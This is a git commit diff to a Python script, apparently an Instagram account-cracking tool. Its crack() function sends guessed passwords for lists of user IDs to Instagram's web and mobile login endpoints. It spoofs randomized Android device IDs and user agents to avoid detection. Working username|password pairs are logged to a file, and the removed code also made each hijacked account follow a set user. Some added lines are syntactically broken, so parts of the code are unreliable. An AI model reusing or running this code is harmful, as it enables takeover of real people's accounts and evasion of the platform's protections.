bd467c0f69858fee9721605fa9e370c82cbf25b2
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2025-12-10 20:16:59 +0530

    Update ins.py

--- ins.py
+++ ins.py
@@ -12,6 +12,13 @@ from requests.exceptions import ConnectionError
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime 
 from bs4 import BeautifulSoup
+import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as bsp
+from rich import print as Print
+from rich.panel import Panel as Nel
+from rich.console import Console
+from rich.tree import Tree
 ###-------[BASIC COLORS]-----------####
 reset = "\033[0m"
 red = "\033[1;31m"
@@ -29,7 +36,9 @@ loop = 0
 idz = []
 oks = []
 cps = []
- 
+id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
+NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []
+
 sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
  
 try:os.mkdir('/sdcard/XYZ')
@@ -111,7 +120,95 @@ def random_number():
     input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
     menu()
  
- 
+#-> Custom Android ID
+def Android_ID(, uid, pww):
+       xyz = hashlib.md5()
+       xyz.update(uid.encode('utf-8') + pww.encode('utf-8'))
+       hex = xyz.hexdigest()
+       xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
+       return xyz
+
+def AppUac(, GoblokLu=None):
+	    brand = random.choice(list(devices.keys()))  # Pilih merek acak
+	    model = random.choice(devices[brand])  # Pilih model acak
+	    android_version = random.randint(24, 34)  # Android versi 7.0 - 14
+	    dpi = random.choice([320, 400, 480, 560])  # DPI acak
+	    width = random.randint(720, 1440)  # Resolusi lebar
+	    height = random.randint(1280, 3120)  # Resolusi tinggi
+	    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES"])  # Bahasa acak
+	    version_code = random.randint(300000000, 400000000)  # Kode versi acak
+	    devices = {
+	    "Realme": ["RMX2020", "RMX2195", "RMX3085"],
+	    "Vivo": ["V2026", "V2140", "V2111"],
+	    "Poco": ["Poco X3 Pro", "Poco F3", "Poco M4 Pro"],
+	    "Samsung": ["SM-A127F", "SM-M215F", "SM-G991B"],
+	    "Infinix": ["Infinix X690B", "Infinix X680", "Infinix X671"],
+	    "Asus": ["ASUS_I005DA", "ASUS_Z01RD", "ASUS_X00TD"],
+	    "iPhone": ["iPhone12,1", "iPhone13,2", "iPhone14,5"],
+	    "Redmi": ["Redmi Note 9", "Redmi Note 10", "Redmi 11 Pro"]}
+	    # Format User-Agent dengan f-string
+	    user_agent = f"Instagram {version_code}.0.0.{random.randint(10, 40)}.{random.randint(100, 500)} Android ({android_version}/{random.randint(10, 15)}; {dpi}dpi; {width}x{height}; {brand}/{brand}; {model}; {model}; mt6768; {lang}; {random.randint(500000000, 900000000)})"
+	    
+	    return user_agent
+       
+
+def timezone_offset():
+       tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
+       ofs = tim.utcoffset().total_seconds()/60/60
+       return ofs
+
+def SetMid():
+       return '' if len(MID) == 0 else random.choice(MID)
+
+def Blok_ID():
+       v23 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
+       v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
+       v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
+       v07 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
+       return(random.choice([v09,v39,v23,v07]))
+
+   # pkg install iproute2
+def UseNet():
+       #net = []
+       #for y in os.popen('ip neigh show'):net.append(y)
+       #if 'wlan' in str(net) or 'wlan0' in str(net):return('WIFI','WIFI')
+       #else:return('MOBILE.LTE','MOBILE(LTE)')
+       return('MOBILE.LTE','MOBILE(LTE)')
+
+def HeadersApiLogin():
+       return {
+          'host': 'b.i.instagram.com',
+          'x-ig-app-locale': 'in_ID',
+          'x-ig-device-locale': 'in_ID',
+          'x-ig-mapped-locale': 'id_ID',
+          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+          'x-ig-bandwidth-speed-kbps': '-1.000',
+          'x-ig-bandwidth-totalbytes-b': '0',
+          'x-ig-bandwidth-totaltime-ms': '0',
+          'x-bloks-version-id': Blok_ID(),
+          'x-bloks-is-prism-enabled': 'false',
+          'x-bloks-is-layout-rtl': 'false',
+          'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
+          'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
+          'x-ig-android-id': 'android-4aca695260085376',
+          'x-ig-timezone-offset': str(timezone_offset()),
+          'x-fb-connection-type': 'MOBILE.LTE',
+          'x-ig-connection-type': 'MOBILE(LTE)',
+          'x-ig-capabilities': '3brTv10=',
+          'x-ig-app-id': '3419628305025917',
+          'priority': 'u=3',
+          'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
+          'accept-language': 'id-ID, en-US',
+          'x-mid': str(SetMid()),
+          'ig-intended-user-id': '0',
+          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+          'content-length': '3146',
+          'x-fb-http-engine': 'Liger',
+          'x-fb-client-ip': 'True',
+          'x-fb-server-cluster': 'True'
+       }
+
 ###-------[METHOD CRACK]-----------####
 def crack(uid, pww, total_idz):
     global loop
@@ -127,89 +224,23 @@ def crack(uid, pww, total_idz):
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-                'csrftoken': csrftoken,
-                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-                'ig_nrcb': '1',
-                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-                'ps_l': '1',
-                'ps_n': '1',
-                'wd': '885x773',}
-            data = {
-                "enc_password": enc_password,
-                'optIntoOneTap': 'false',
-                'queryParams': '{"hl":"en"}',
-                'trustedDeviceRecords': '{}',
-                'username': uid,}
-            headers = {
-                'authority': 'www.instagram.com',
-                'accept': '*/*',
-                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
-                'content-type': 'application/x-www-form-urlencoded',
-                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
-                'origin': 'https://www.instagram.com',
-                'priority': 'u=1, i',
-                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-model': '""',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
-                'x-asbd-id': '129477',
-                'x-csrftoken': csrftoken,
-                'x-ig-app-id': '936619743392459',
-                'x-ig-www-claim': '0',
-                'x-instagram-ajax': '1015820104',
-                'x-requested-with': 'XMLHttpRequest',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
-            session_cookies = response.cookies.get_dict()
-            if response.status_code == 200:
-                json_response = response.json()
-                if json_response.get('status') == 'ok':
-                   if json_response.get('authenticated') == True:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif json_response.get('auth_token'):
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
-                   elif 'sessionid' in session_cookies:
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookies}")
-                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
-                        oks.append(uid)
-                        user_id = 'sumon_roy_00'
-                        follow_response = session.post(FOLLOW_URL.format(user_id=user_id), headers=headers)
-                        if follow_response.status_code == 200:
-                           print("Follow request sent successfully!")
-                        else:
-                           print("Failed to send follow request.")
-                        return True
+            session.headers.update({**HeadersApiLogin(),
+            'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+            'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
+            'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
+            'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
+            'user-agent': AppUac(HeadersApiLogin()['x-bloks-version-id']),
+            'x-ig-android-id': 'android-' + str(Android_ID(uid, pw).hexdigest()[:16]),
+            'x-ig-family-device-id': str(uuid.uuid4()),
+            'x-ig-device-id': str(uuid.uuid4())})
+            DataRec = {'params': '{"client_input_params":{"contact_point":"'+uid+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'","event_flow":"account_recovery","family_device_id":"'+session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(session.headers['x-bloks-version-id'])}
+            Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(DataRec['params']), urllib.parse.quote(DataRec['bk_client_context']), DataRec['bloks_versioning_id'])
+            Respons = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=Query,allow_redirects=True)
+            if 'logged_in_user' in Respons.text.replace('\\',''):
+                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
+                oks.append(uid)
+                return True
             else:
                 print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
